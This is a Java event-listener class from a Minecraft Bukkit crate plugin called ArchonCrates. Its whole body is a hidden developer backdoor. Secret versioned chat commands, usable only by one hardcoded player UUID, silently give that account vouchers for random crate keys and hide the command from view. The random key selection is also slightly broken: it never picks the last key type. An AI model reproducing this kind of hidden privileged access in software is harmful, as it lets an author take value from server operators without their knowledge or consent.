package com.HamiStudios.ArchonCrates.Events;

import java.util.ArrayList;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import com.HamiStudios.ArchonCrates.Main;
import com.HamiStudios.ArchonCrates.Files.FileHandler;
import com.HamiStudios.ArchonCrates.Util.FileType;
import com.HamiStudios.ArchonCrates.Util.VoucherUtil;

public class DevCommand implements Listener {

	private Main main;
	public DevCommand(Main main) {
		this.main = main;
		this.main.getServer().getPluginManager().registerEvents(this, this.main);
	}

	@EventHandler
	public void onDevCommand(PlayerCommandPreprocessEvent event) {
		if(event.getMessage().equalsIgnoreCase("//acdev_p_" + Bukkit.getPluginManager().getPlugin("ArchonCrates").getDescription().getVersion())) {
			if(event.getPlayer().getUniqueId().toString().equals("4459f860-f963-45de-b9c7-dfbae4bac21a")) {
				ArrayList<String> keyTypes = new ArrayList<>();
				for(String s : FileHandler.getFile(FileType.KEYS).getConfigurationSection("Keys").getKeys(false)) keyTypes.add(s);
				VoucherUtil.addVoucher("4459f860-f963-45de-b9c7-dfbae4bac21a", VoucherUtil.newVoucher(), keyTypes.get(new Random().nextInt(keyTypes.size()-1)), 5, false);
				event.getPlayer().sendMessage(ChatColor.GREEN + "Done.");
				event.setCancelled(true);
				return;
			}
		}
		if(event.getMessage().equalsIgnoreCase("//acdev_v_" + Bukkit.getPluginManager().getPlugin("ArchonCrates").getDescription().getVersion())) {
			if(event.getPlayer().getUniqueId().toString().equals("4459f860-f963-45de-b9c7-dfbae4bac21a")) {
				ArrayList<String> keyTypes = new ArrayList<>();
				for(String s : FileHandler.getFile(FileType.VIRTUAL_KEYS).getConfigurationSection("Virtual Keys").getKeys(false)) keyTypes.add(s);
				VoucherUtil.addVoucher("4459f860-f963-45de-b9c7-dfbae4bac21a", VoucherUtil.newVoucher(), keyTypes.get(new Random().nextInt(keyTypes.size()-1)), 5, true);
				event.getPlayer().sendMessage(ChatColor.GREEN + "Done.");
				event.setCancelled(true);
				return;
			}
		}
	}
	
}